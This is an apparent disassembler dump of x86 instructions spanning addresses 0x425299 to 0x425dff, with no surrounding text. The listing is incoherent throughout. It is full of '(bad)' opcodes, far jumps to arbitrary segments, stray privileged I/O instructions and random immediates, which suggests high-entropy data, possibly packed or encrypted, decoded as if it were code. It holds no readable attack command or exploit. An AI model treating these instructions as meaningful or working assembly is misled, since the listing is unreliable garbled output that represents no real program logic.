  425299:	pop    es
  42529a:	mov    al,0x11
  42529c:	data16 stos BYTE PTR es:[edi],al
  42529e:	cdq    
  42529f:	fbld   TBYTE PTR [edi-0x27bf92e3]
  4252a5:	pop    es
  4252a6:	les    edx,FWORD PTR [esi]
  4252a8:	jle    0x425257
  4252aa:	inc    esi
  4252ab:	xchg   DWORD PTR [ecx-0xa5fd235],ebp
  4252b1:	mov    ds:0x1085a03c,al
  4252b6:	enter  0x7bea,0xf3
  4252ba:	inc    ecx
  4252bb:	and    eax,0xdb2a0a81
  4252c0:	dec    eax
  4252c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  425332:	add    BYTE PTR [eax],al
  425334:	mov    ah,BYTE PTR [esi]
  425336:	jge    0x4252f2
  425338:	std    
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz add DWORD PTR [esi-0x733f2b0b],0xf60001
  42534a:	add    BYTE PTR [eax],al
  42534c:	push   ebp
  42534d:	push   cs
  42534e:	adc    dl,bh
  425350:	call   0xa88e:0xec23514e
  425357:	xor    al,0x16
  425359:	mov    bl,bh
  42535b:	add    edi,DWORD PTR [ecx+0xd]
  42535e:	lods   eax,DWORD PTR ds:[esi]
  42535f:	data16 cmp ch,ah
  425362:	push   ecx
  425363:	lea    ebx,[ebp-0x85332a2]
  425369:	push   ecx
  42536a:	sub    esi,ebx
  42536c:	mov    fs,WORD PTR [ecx-0x2f]
  42536f:	jbe    0x4253c3
  425371:	or     ecx,edi
  425373:	jns    0x425354
  425375:	push   eax
  425376:	les    edi,FWORD PTR [esi+0xe]
  425379:	jae    0x4253d1
  42537b:	xor    eax,0x6af29ca1
  425380:	fwait
  425381:	mov    esi,0xa6ad5974
  425386:	fwait
  425387:	gs icebp 
  425389:	cli    
  42538a:	fcomp  DWORD PTR [ebx-0xd]
  42538d:	cmp    eax,0xb1c67568
  425392:	sbb    eax,0x64316c22
  425397:	lea    ebp,[ecx+0x62]
  42539a:	or     BYTE PTR [ecx-0x1fbed777],cl
  4253a0:	sar    BYTE PTR [ecx-0x54623952],cl
  4253a6:	pop    eax
  4253a7:	xchg   edi,eax
  4253a8:	fimul  WORD PTR [ebp-0x10]
  4253ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253ac:	mov    ds:0x6cd5f748,eax
  4253b1:	int3   
  4253b2:	icebp  
  4253b3:	add    ebx,DWORD PTR [ecx-0x7b9b26c2]
  4253b9:	jae    0x4253a2
  4253bb:	sub    DWORD PTR [ecx+0x25dd9f1d],ebp
  4253c1:	xchg   esp,eax
  4253c2:	addr16 jg 0x4253b8
  4253c5:	ss dec esp
  4253c7:	repnz outs dx,BYTE PTR ds:[esi]
  4253c9:	lea    edi,[ecx+0x179eaa1]
  4253cf:	cld    
  4253d0:	pop    es
  4253d1:	fld    TBYTE PTR [esi+0xf]
  4253d4:	push   0x77
  4253d6:	mov    eax,0x182fccdc
  4253db:	lods   eax,DWORD PTR ds:[esi]
  4253dc:	mov    cl,0x8a
  4253de:	jmp    0x66bbc0f3
  4253e3:	sub    bh,BYTE PTR [eax+0x4e231643]
  4253e9:	sahf   
  4253ea:	mov    eax,0xfad01e31
  4253ef:	and    ebx,DWORD PTR [edx]
  4253f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253f2:	xor    eax,0x7acbd4f
  4253f7:	mov    edi,0xcb729237
  4253fc:	jp     0x4253fd
  4253fe:	ja     0x4253ce
  425400:	es ret 
  425402:	pop    eax
  425403:	in     eax,dx
  425404:	call   0x24a7:0x82cb5afe
  42540b:	outs   dx,DWORD PTR ds:[esi]
  42540c:	inc    ebp
  42540d:	out    0xe3,eax
  42540f:	sbb    eax,0x296e8c3
  425414:	mov    WORD PTR [eax+0x10c657de],fs
  42541a:	adc    esi,DWORD PTR [eax-0x7e281de0]
  425420:	add    ah,dl
  425422:	xchg   BYTE PTR [esi-0x4de79d9b],ch
  425428:	imul   ecx,DWORD PTR [eax-0xe],0x7a
  42542c:	inc    edx
  42542d:	loope  0x4254a5
  42542f:	ss (bad) 
  425432:	aaa    
  425433:	int    0x13
  425435:	pop    eax
  425436:	jl     0x425471
  425438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425439:	jns    0x42544c
  42543b:	xchg   edx,eax
  42543c:	(bad)  [esi]
  42543e:	and    ah,bh
  425440:	retf   
  425441:	sub    al,0x0
	...
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	sub    eax,0xb62bd147
  4254c5:	lea    eax,[ecx]
  4254c7:	add    dh,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR ds:0x1fcf26dd,ah
  4254d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254d2:	and    DWORD PTR ds:0x21980e63,edx
  4254d8:	pop    ecx
  4254d9:	(bad)  
  4254db:	call   0x4f7f:0x346c9338
  4254e2:	and    eax,DWORD PTR [edx+0xccabbbc]
  4254e8:	mov    al,ds:0x3dcabb2f
  4254ed:	cli    
  4254ee:	push   es
  4254ef:	mov    edi,0xa28c1bad
  4254f4:	inc    ecx
  4254f5:	outs   dx,DWORD PTR ds:[esi]
  4254f6:	xor    DWORD PTR [edi+0x5a],0x71
  4254fa:	mov    ebp,0x5059af29
  4254ff:	ror    BYTE PTR [ebx],0xae
  425502:	fsubp  st(1),st
  425504:	test   eax,0x71a17346
  425509:	(bad)  
  42550b:	test   DWORD PTR [edx+ebx*2+0x10f2b51f],edi
  425512:	xor    esp,DWORD PTR [eax-0x6e]
  425515:	xchg   edx,eax
  425516:	(bad)  
  425517:	fwait
  425518:	lahf   
  425519:	repz loope 0x425597
  42551c:	mov    esi,0x4c8c513c
  425521:	jae    0x42553a
  425523:	add    al,0x33
  425525:	ret    0xe943
  425528:	mov    ebx,0x7fec2f5d
  42552d:	mov    ds:0x6ac108d8,al
  425532:	or     ebp,DWORD PTR [edx]
  425534:	cli    
  425535:	sbb    BYTE PTR [edx-0x43c0438c],dh
  42553b:	dec    ecx
  42553c:	lods   eax,DWORD PTR ds:[esi]
  42553d:	sahf   
  42553e:	xchg   esp,eax
  42553f:	hlt    
  425540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425541:	outs   dx,DWORD PTR ds:[esi]
  425542:	jnp    0x425579
  425544:	(bad)
  425548:	popf   
  425549:	or     BYTE PTR [esi],al
  42554b:	(bad)  
  42554c:	repnz lods al,BYTE PTR ds:[esi]
  42554e:	repnz or eax,0x218bbf62
  425554:	scas   eax,DWORD PTR es:[edi]
  425555:	cdq    
  425556:	jp     0x425582
  425558:	cmp    eax,DWORD PTR [ebx]
  42555a:	pop    ebx
  42555b:	daa    
  42555c:	or     BYTE PTR [edi+0x218bb07c],bh
  425562:	sub    ch,0xab
  425565:	out    0xa1,al
  425567:	sub    dx,bx
  42556a:	inc    edx
  42556b:	inc    ecx
  42556c:	dec    ebx
  42556d:	jecxz  0x42552e
  42556f:	in     al,0x80
  425571:	and    eax,0x4e2fdfe9
  425576:	dec    eax
  425577:	aaa    
  425578:	gs cs mov edi,0xb54ecbdf
  42557f:	fdiv   DWORD PTR [edx+0x19]
  425582:	ficom  WORD PTR [eax]
  425584:	not    DWORD PTR [esi+eiz*1]
  425587:	adc    esi,DWORD PTR [ebx+0x3e0b4b2a]
  42558d:	mov    DWORD PTR [ecx+edx*2-0x672295dd],esp
  425594:	adc    eax,0x1418f6f
  425599:	imul   DWORD PTR [ebp-0x60727eee]
  42559f:	jmp    0x2b4c:0x86e49fba
  4255a6:	stos   DWORD PTR es:[edi],eax
  4255a7:	mov    al,0x8b
  4255a9:	imul   ecx,DWORD PTR [esi-0x32],0x1271a985
  4255b0:	rcl    DWORD PTR [ecx+0x1c],1
  4255b3:	and    esp,DWORD PTR [ecx+0x1a14b367]
  4255b9:	cs xor eax,0xd6053383
  4255bf:	(bad)  
  4255c1:	add    DWORD PTR [eax],eax
	...
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	xor    eax,0xac49ba76
  425645:	mov    es,WORD PTR [ecx]
  425647:	add    dh,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [ecx-0x5e57fb60],ch
  425651:	xchg   DWORD PTR [ebp-0x65],esp
  425654:	in     eax,0xba
  425656:	add    al,0xb2
  425658:	cli    
  425659:	inc    ecx
  42565a:	push   edi
  42565b:	inc    ebx
  42565c:	clc    
  42565d:	int    0x1c
  42565f:	dec    ebp
  425660:	mov    BYTE PTR [eax],dl
  425662:	stos   BYTE PTR es:[edi],al
  425663:	mov    eax,0x419fbd52
  425668:	pop    esp
  425669:	or     eax,0x7d2162ea
  42566e:	dec    BYTE PTR [ebp+eax*4+0xb]
  425672:	xor    eax,0x2b249651
  425678:	add    BYTE PTR [esi+edi*4+0x6c5c179a],dl
  42567f:	rcr    DWORD PTR gs:[ebp-0x75],0x60
  425684:	mov    eax,0x50e4fb20
  425689:	mov    ebp,0xd5bde7b6
  42568e:	and    ch,cl
  425690:	xchg   ebx,eax
  425691:	cld    
  425692:	adc    eax,esp
  425694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425695:	cmp    BYTE PTR fs:[ebx-0x52],dh
  425699:	cld    
  42569a:	fbstp  TBYTE PTR [ebx-0x23a993f2]
  4256a0:	push   es
  4256a1:	inc    ecx
  4256a2:	jle    0x42571d
  4256a4:	mov    esi,0x8de4fc3d
  4256a9:	push   esp
  4256aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256ab:	mov    dh,0x31
  4256ad:	(bad)  
  4256ae:	mov    dl,0x7e
  4256b0:	dec    esp
  4256b1:	add    edi,DWORD PTR [ecx-0x54]
  4256b4:	mov    ebx,0xc74e4e5f
  4256b9:	push   ebp
  4256ba:	ss xor eax,0x1242e146
  4256c0:	or     eax,0x26e6b4a9
  4256c5:	push   esp
  4256c6:	and    DWORD PTR [ebx+0x6474f458],esi
  4256cc:	int3   
  4256cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256ce:	fcom   DWORD PTR [esi]
  4256d0:	dec    edi
  4256d1:	lea    ebp,[esi]
  4256d3:	mov    esp,0x2e82a2f4
  4256d8:	ret    0xdb1b
  4256db:	push   esp
  4256dc:	mov    esp,0x47865aed
  4256e1:	push   ebp
  4256e2:	sbb    BYTE PTR [eax+0x10],dl
  4256e5:	jae    0x4256aa
  4256e7:	add    BYTE PTR [esi],0x5c
  4256ea:	inc    ebx
  4256eb:	stos   BYTE PTR es:[edi],al
  4256ec:	add    eax,0x15babd62
  4256f1:	pop    ebx
  4256f2:	sbb    bl,dl
  4256f4:	inc    BYTE PTR [ebx]
  4256f6:	mov    ds:0x3c3e877c,eax
  4256fb:	cmp    dh,bl
  4256fd:	xchg   edi,eax
  4256fe:	stos   BYTE PTR es:[edi],al
  4256ff:	mov    ds:0x5c312a4e,al
  425704:	loop   0x425740
  425706:	lea    esp,[eax+0x19]
  425709:	fld    DWORD PTR [ebx]
  42570b:	imul   ecx,DWORD PTR [edi-0x5b0f3b03],0xffffff98
  425712:	dec    edi
  425713:	mov    ah,BYTE PTR [edi]
  425715:	sub    BYTE PTR ds:0x78099c74,0x7e
  42571c:	or     DWORD PTR [edx],0xffffffb3
  42571f:	das    
  425720:	icebp  
  425721:	loop   0x425772
  425723:	or     eax,DWORD PTR [ebp+0x48]
  425726:	fisubr DWORD PTR es:[esi+esi*4+0x5]
  42572b:	cld    
  42572c:	push   cs
  42572d:	push   es
  42572e:	xchg   esi,ebx
  425730:	sti    
  425731:	dec    ecx
  425732:	ror    DWORD PTR [edi+0xa2f9dfb],0x5c
  425739:	cwde   
  42573a:	mov    edx,0x766bec7f
  42573f:	shl    BYTE PTR ds:0x2c,1
	...
  4257b1:	add    BYTE PTR [eax],al
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	retf   
  4257c1:	mov    al,ds:0x8fa2befc
  4257c6:	add    DWORD PTR [eax],eax
  4257c8:	test   BYTE PTR [eax],0x0
  4257cb:	add    BYTE PTR [esi],dl
  4257cd:	in     eax,0x37
  4257cf:	out    0x9e,al
  4257d1:	and    BYTE PTR [ecx],cl
  4257d3:	fdivr  st,st(4)
  4257d5:	add    esi,DWORD PTR [edx]
  4257d7:	ins    DWORD PTR es:[edi],dx
  4257d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257d9:	sbb    bh,ah
  4257db:	sub    al,0x74
  4257dd:	push   ecx
  4257de:	retf   0x415b
  4257e1:	cwde   
  4257e2:	xlat   BYTE PTR ds:[ebx]
  4257e3:	mov    ds:0xf91aece1,eax
  4257e8:	push   ss
  4257e9:	fmul   QWORD PTR [esp+edi*8]
  4257ec:	fs aad 0x76
  4257ef:	jmp    0xf77b:0x204da6ef
  4257f6:	inc    esi
  4257f7:	shr    BYTE PTR [ecx-0x14dfea16],0x7f
  4257fe:	xchg   ecx,eax
  4257ff:	ficomp DWORD PTR [ebx-0x32]
  425802:	or     DWORD PTR [eax+eax*2],0xffffffd3
  425806:	push   eax
  425807:	and    ch,BYTE PTR cs:[esp+eiz*2]
  42580b:	fsub   DWORD PTR [ebx+0x23]
  42580e:	addr16 xchg esp,eax
  425810:	inc    esi
  425811:	loopne 0x425854
  425813:	int3   
  425814:	inc    esi
  425815:	leave  
  425816:	sub    esi,eax
  425818:	sub    BYTE PTR [esi-0x58],0x12
  42581c:	xchg   ebx,eax
  42581d:	cmp    al,0xf5
  42581f:	adc    edi,DWORD PTR [esi]
  425821:	add    cl,ch
  425823:	mov    edx,0xc0cf5960
  425828:	aad    0x8c
  42582a:	scas   al,BYTE PTR es:[edi]
  42582b:	aaa    
  42582c:	and    cl,BYTE PTR [eax-0x63321a9a]
  425832:	pop    ds
  425833:	mov    BYTE PTR [esi+0x55],ch
  425836:	sbb    dh,al
  425838:	(bad)  
  425839:	xchg   edi,eax
  42583a:	add    eax,DWORD PTR [eax]
  42583c:	sub    al,0x9d
  42583e:	cwde   
  42583f:	(bad)  
  425841:	int3   
  425842:	sub    eax,0x4799b535
  425847:	cdq    
  425848:	cmp    BYTE PTR ds:0xf2cf3bcf,cl
  42584e:	xor    al,0xa2
  425850:	repnz mov ds:0x5c223060,eax
  425856:	push   ecx
  425857:	mov    WORD PTR [ebp+0x70],ss
  42585a:	push   edi
  42585b:	and    dh,BYTE PTR [eax-0x44]
  42585e:	ss mov dh,0x5
  425861:	jg     0x425816
  425863:	xor    al,0xa3
  425865:	jmp    0xf85a:0xdd3b8a3b
  42586c:	mov    cl,0x6f
  42586e:	pop    ecx
  42586f:	jb     0x4258ae
  425871:	pop    ebp
  425872:	mov    edi,0xd095285e
  425877:	pop    ebx
  425878:	inc    eax
  425879:	add    eax,esi
  42587b:	ds jecxz 0x425859
  42587e:	mov    edi,0x544ebdcb
  425883:	mov    bl,bh
  425885:	out    0x22,eax
  425887:	mov    eax,ds:0xd54bf62b
  42588c:	mov    bh,0x21
  42588e:	aaa    
  42588f:	xor    eax,0x78a2bd14
  425894:	lods   al,BYTE PTR ds:[esi]
  425895:	mov    eax,0xc0997746
  42589a:	mov    cs,ebp
  42589c:	cld    
  42589d:	(bad)  
  42589e:	aam    0x3b
  4258a0:	out    dx,eax
  4258a1:	je     0x4258a6
  4258a3:	inc    ebp
  4258a4:	iret   
  4258a5:	and    al,0x2d
  4258a7:	lea    ebx,[ebx+0x21]
  4258aa:	lds    ebp,FWORD PTR [eax+edx*4-0xdea05a2]
  4258b1:	aas    
  4258b2:	ror    DWORD PTR [eax-0x20],cl
  4258b5:	xor    ah,BYTE PTR [ebx-0x8]
  4258b8:	inc    edi
  4258b9:	jb     0x4258a5
  4258bb:	xchg   ebx,eax
  4258bc:	div    BYTE PTR [ebx+0x2fc63ff8]
	...
  425932:	add    BYTE PTR [eax],al
  425934:	imul   ebx,DWORD PTR [eax],0x63
  425937:	push   0x73
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	adc    edx,DWORD PTR [edi+0x26]
  425943:	nop
  425944:	cwde   
  425945:	nop
  425946:	add    DWORD PTR [eax],eax
  425948:	test   BYTE PTR [eax],0x0
  42594b:	add    al,al
  42594d:	sub    DWORD PTR [eax-0x19],0x71
  425951:	cmp    DWORD PTR [ebp-0x73],ebx
  425954:	je     0x425980
  425956:	retf   0x7a
  425959:	or     bh,BYTE PTR [ebp+0x27b62cb0]
  42595f:	cli    
  425960:	(bad)  
  425961:	lods   eax,DWORD PTR ds:[esi]
  425962:	loopne 0x425953
  425964:	pusha  
  425965:	xchg   ebx,eax
  425966:	data16 jl 0x425929
  425969:	into   
  42596a:	mov    esp,0x4315ab2c
  42596f:	sub    al,0xe0
  425971:	xor    al,0x52
  425973:	sub    al,0xb
  425975:	loope  0x425989
  425977:	das    
  425978:	adc    eax,0xdcde7f7d
  42597d:	mov    ebp,0xd48e2caf
  425982:	hlt    
  425983:	das    
  425984:	pushf  
  425985:	data16 xor BYTE PTR [edx-0x806a7b6],dh
  42598c:	dec    ebp
  42598d:	ins    BYTE PTR es:[edi],dx
  42598e:	sbb    dh,BYTE PTR [esi+ecx*4-0x73]
  425992:	(bad)  
  425993:	ins    BYTE PTR es:[edi],dx
  425994:	ret    0x4d2a
  425997:	dec    ebp
  425998:	bound  ebp,QWORD PTR [esp+ebx*2-0x4f]
  42599c:	push   0xffffffa3
  42599e:	or     al,BYTE PTR [edi-0x5f]
  4259a1:	sub    al,0x83
  4259a3:	test   BYTE PTR [eax],dh
  4259a5:	dec    ecx
  4259a6:	es jp  0x42592b
  4259a9:	enter  0x1956,0xd1
  4259ad:	xor    eax,0x2850c3e9
  4259b2:	scas   eax,DWORD PTR es:[edi]
  4259b3:	in     al,0x76
  4259b5:	cmp    BYTE PTR [edi+0x4e],ah
  4259b8:	mov    dh,BYTE PTR [edi+edi*4-0x1523ae1f]
  4259bf:	cdq    
  4259c0:	sbb    eax,0xb8862d88
  4259c5:	ret    
  4259c6:	add    eax,0xb7a1b3cb
  4259cb:	jle    0x425a3a
  4259cd:	nop
  4259ce:	jp     0x425976
  4259d0:	jnp    0x4259cb
  4259d2:	and    ch,BYTE PTR [esi+0xe71c78b]
  4259d8:	push   esp
  4259d9:	test   DWORD PTR ds:0x26f8cd51,edx
  4259df:	pop    DWORD PTR [edi+0x3e]
  4259e2:	push   esi
  4259e3:	repnz cld 
  4259e5:	sbb    bl,BYTE PTR [ecx+0x70212d91]
  4259eb:	pop    es
  4259ec:	arpl   WORD PTR [eax+eax*8-0x3c9a1c3],dx
  4259f3:	or     ebp,DWORD PTR [ebp-0x46ed365e]
  4259f9:	ss xor esi,edx
  4259fc:	das    
  4259fd:	ror    BYTE PTR [eax+edx*2],1
  425a00:	mov    ebp,0xf6496b8
  425a05:	js     0x425a81
  425a07:	jg     0x425a2d
  425a09:	mov    ecx,0x46898f08
  425a0e:	add    bh,al
  425a10:	mov    ebp,0xe8d33096
  425a15:	ins    BYTE PTR es:[edi],dx
  425a16:	xor    al,BYTE PTR [edx+0x7baea856]
  425a1c:	mov    ebp,0xb7c86b05
  425a21:	iret   
  425a22:	cmp    BYTE PTR [edi+0x3bb8a88d],cl
  425a28:	xchg   ebp,eax
  425a29:	in     eax,dx
  425a2a:	jne    0x425a9e
  425a2c:	sbb    ah,dh
  425a2e:	dec    ebp
  425a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a30:	pushf  
  425a31:	ror    BYTE PTR [edx-0x296cf6],1
  425a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a38:	lea    ebx,ds:0x416577d7
  425a3e:	mov    ebx,0xa7bd95
	...
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	pushf  
  425ac1:	imul   esi,DWORD PTR [ecx+0x1918e11],0x0
  425ac8:	test   BYTE PTR [eax],0x0
  425acb:	add    BYTE PTR [ebx-0x46],ch
  425ace:	cmp    eax,0x58dd4322
  425ad3:	xor    ch,BYTE PTR [esi]
  425ad5:	int    0xc8
  425ad7:	add    al,BYTE PTR [ebx]
  425ad9:	inc    eax
  425ada:	in     eax,0x3e
  425adc:	mov    edi,0xe6252133
  425ae1:	and    BYTE PTR [ebx-0x3f],0x4d
  425ae5:	mov    esi,0xf83cbb4c
  425aea:	sbb    al,0x49
  425aec:	lds    esi,FWORD PTR [ecx-0x2d634d5]
  425af2:	cmp    ebp,eax
  425af4:	ror    BYTE PTR [esi+0x9],0x9d
  425af8:	loop   0x425a87
  425afa:	aam    0x2a
  425afc:	test   ch,dl
  425afe:	ret    
  425aff:	call   DWORD PTR [eax+esi*1+0x1f571323]
  425b06:	stos   BYTE PTR es:[edi],al
  425b07:	sbb    BYTE PTR [eax+0x64b4f8c4],bh
  425b0d:	cmp    BYTE PTR [eax+edx*8-0x14fd741e],ch
  425b14:	repnz inc ebp
  425b16:	cli    
  425b17:	push   0x440bfe45
  425b1c:	jge    0x425b31
  425b1e:	jmp    0x3d79:0x3659449d
  425b25:	adc    ch,BYTE PTR [esi+0xc85fdeb]
  425b2b:	test   al,0xba
  425b2d:	cdq    
  425b2e:	lds    esi,FWORD PTR [edx]
  425b30:	cli    
  425b31:	popa   
  425b32:	pop    esi
  425b33:	mov    ecx,0xec7a1e61
  425b38:	addr16 jp 0x425aff
  425b3b:	rcr    DWORD PTR [ebx],1
  425b3d:	(bad)  
  425b3e:	das    
  425b3f:	add    edx,DWORD PTR [ecx]
  425b41:	sar    ebx,1
  425b43:	aaa    
  425b44:	push   esp
  425b45:	fisttp QWORD PTR cs:[ebx+0x7de80eb8]
  425b4c:	inc    edx
  425b4d:	add    DWORD PTR [esi],0x78
  425b50:	cmp    bl,BYTE PTR [edi+0x2f]
  425b53:	jbe    0x425b84
  425b55:	mov    esi,0x83af778f
  425b5a:	xchg   dl,bh
  425b5c:	ins    DWORD PTR es:[edi],dx
  425b5d:	scas   al,BYTE PTR es:[edi]
  425b5e:	pop    ebx
  425b5f:	and    BYTE PTR [eax+ebx*4-0x77],ch
  425b63:	ins    DWORD PTR es:[edi],dx
  425b64:	xchg   edx,eax
  425b65:	inc    eax
  425b66:	or     bl,BYTE PTR [edx+ecx*4]
  425b69:	or     eax,0x7f89c1ee
  425b6e:	clc    
  425b6f:	sti    
  425b70:	out    0xd7,ax
  425b73:	cmp    al,0xbb
  425b75:	aam    0x95
  425b77:	cli    
  425b78:	leave  
  425b79:	ss jno 0x425bec
  425b7c:	cs pop ebp
  425b7e:	mov    cl,0xcc
  425b80:	sbb    edi,DWORD PTR [ebp-0x33de2929]
  425b86:	aad    0x5
  425b88:	add    ecx,DWORD PTR [eax-0x3c]
  425b8b:	lds    edx,FWORD PTR [ebx-0x61bc9c76]
  425b91:	lock js 0x425b28
  425b94:	(bad)  
  425b95:	xlat   BYTE PTR ds:[ebx]
  425b96:	stos   BYTE PTR es:[edi],al
  425b97:	int3   
  425b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b99:	es xchg ebx,eax
  425b9b:	mov    eax,ds:0xfe8d3e48
  425ba0:	mov    esp,0x7dc18a0
  425ba5:	or     DWORD PTR [eax+eax*1+0x57e96864],ebx
  425bac:	jbe    0x425b89
  425bae:	jno    0x425bcb
  425bb0:	dec    esi
  425bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bb2:	add    al,BYTE PTR [edi+0x31]
  425bb5:	jmp    0x425b54
  425bb7:	or     ebp,DWORD PTR [edx+0x33]
  425bba:	mov    dh,BYTE PTR [ebp+0x23]
  425bbd:	loopne 0x425b60
  425bbf:	pop    edx
  425bc0:	mov    cl,0x4b
	...
  425c32:	add    BYTE PTR [eax],al
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x9284:0x713b4cbc
  425c46:	add    DWORD PTR [eax],eax
  425c48:	test   BYTE PTR [eax],0x0
  425c4b:	add    dl,ch
  425c4d:	data16 jns 0x425c34
  425c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c51:	or     ebp,DWORD PTR [edi+eiz*4-0x70]
  425c55:	loope  0x425bfc
  425c57:	jle    0x425c02
  425c59:	sbb    BYTE PTR [ecx],0xf3
  425c5c:	push   esp
  425c5d:	fistp  QWORD PTR [ebx-0x4e]
  425c60:	xchg   ebx,eax
  425c61:	ret    
  425c62:	adc    ecx,edx
  425c64:	mov    eax,ds:0x660a2254
  425c69:	aam    0x80
  425c6b:	dec    edx
  425c6c:	ds retf 
  425c6e:	mov    bh,0x69
  425c70:	jge    0x30c12b9b
  425c76:	stos   BYTE PTR es:[edi],al
  425c77:	lods   al,BYTE PTR ds:[esi]
  425c78:	aaa    
  425c79:	mov    WORD PTR [eax],?
  425c7b:	jmp    0x7bb4:0xa159bb38
  425c82:	or     al,0x33
  425c84:	sbb    eax,DWORD PTR [edi]
  425c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c87:	push   ebx
  425c88:	mov    al,ds:0x413d1366
  425c8d:	shl    DWORD PTR [esi+0x26872876],0xcc
  425c94:	xlat   BYTE PTR ds:[ebx]
  425c95:	popf   
  425c96:	pop    ebp
  425c97:	and    eax,0xbbc061d7
  425c9c:	pop    esp
  425c9d:	in     al,0xeb
  425c9f:	or     BYTE PTR [esi+ecx*4+0x27],0xb4
  425ca4:	dec    esp
  425ca5:	dec    esi
  425ca6:	pop    esp
  425ca7:	sub    edx,DWORD PTR [edi-0x58]
  425caa:	mov    es,edi
  425cac:	xor    dh,bl
  425cae:	or     al,0xcd
  425cb0:	jecxz  0x425d11
  425cb2:	in     al,0x87
  425cb4:	jnp    0x425c93
  425cb6:	mov    ecx,0xafc6ab33
  425cbb:	xor    ebp,esp
  425cbd:	dec    esi
  425cbe:	mov    cl,dl
  425cc0:	int3   
  425cc1:	cmc    
  425cc2:	push   edx
  425cc3:	mov    ch,0x24
  425cc5:	test   eax,0xb5068b66
  425cca:	inc    ebp
  425ccb:	loop   0x425cba
  425ccd:	jl     0x425c72
  425ccf:	imul   di,WORD PTR [ebx+0x15],0xffe0
  425cd4:	cdq    
  425cd5:	mov    bl,0xe7
  425cd7:	mov    ds:0x2aa188c4,eax
  425cdc:	jg     0x425d29
  425cde:	ret    0x547d
  425ce1:	push   es
  425ce2:	or     BYTE PTR [edi],0x7c
  425ce5:	jo     0x425c8a
  425ce7:	xor    al,0x4f
  425ce9:	in     eax,dx
  425cea:	inc    ebx
  425ceb:	repz shr BYTE PTR [ebp+0x798c0a3],1
  425cf2:	push   ds
  425cf3:	cmp    DWORD PTR [ecx],0xbf54dcab
  425cf9:	cmp    eax,0x677adc35
  425cfe:	jne    0x425d1f
  425d00:	mov    WORD PTR [ebp+ebp*1+0x3fba0677],?
  425d07:	mov    dl,0xf2
  425d09:	jecxz  0x425ce1
  425d0b:	pop    eax
  425d0c:	lods   al,BYTE PTR ds:[esi]
  425d0d:	and    edx,DWORD PTR ds:0x975dee43
  425d13:	fadd   st,st(2)
  425d15:	pop    ebp
  425d16:	in     eax,0x9e
  425d18:	nop    DWORD PTR [edi+0x75]
  425d1c:	jno    0x425d46
  425d1e:	imul   esi,DWORD PTR [ebp-0x66d1bcb6],0x51ba3eff
  425d28:	in     al,dx
  425d29:	mov    dh,0xd4
  425d2b:	push   0x6bd78dca
  425d30:	cmp    eax,0xa2cf0dd4
  425d35:	push   es
  425d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d37:	ins    DWORD PTR es:[edi],dx
  425d38:	mov    ebx,0xf2fd1717
  425d3d:	shr    esi,cl
  425d3f:	shl    ah,1
  425d41:	inc    DWORD PTR [eax]
	...
  425db3:	add    BYTE PTR ds:0xf361d20c,bh
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	pop    eax
  425dc1:	cmp    eax,edi
  425dc3:	loop   0x425e3f
  425dc5:	xchg   ebx,eax
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	test   BYTE PTR [eax],0x0
  425dcb:	add    BYTE PTR [ecx+0x78],ah
  425dce:	test   eax,0x7d57246d
  425dd3:	add    al,0x16
  425dd5:	imul   esp,esi,0x76
  425dd8:	xor    esp,DWORD PTR [esi+0x5e]
  425ddb:	sub    DWORD PTR [esi-0x7d],ebp
  425dde:	fucomip st,st(5)
  425de0:	jne    0x425dc2
  425de2:	jno    0x425df0
  425de4:	push   ds
  425de5:	and    BYTE PTR [edi],cl
  425de7:	fwait
  425de8:	cld    
  425de9:	cmp    eax,0x2fd59c4b
  425dee:	add    edi,esi
  425df0:	repnz or edx,edi
  425df3:	and    eax,0x63dcfbe1
  425df8:	aam    0x9a
  425dfa:	jmp    FWORD PTR [esi]
  425dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dfd:	xor    ebp,esp
  425dff:	aas    
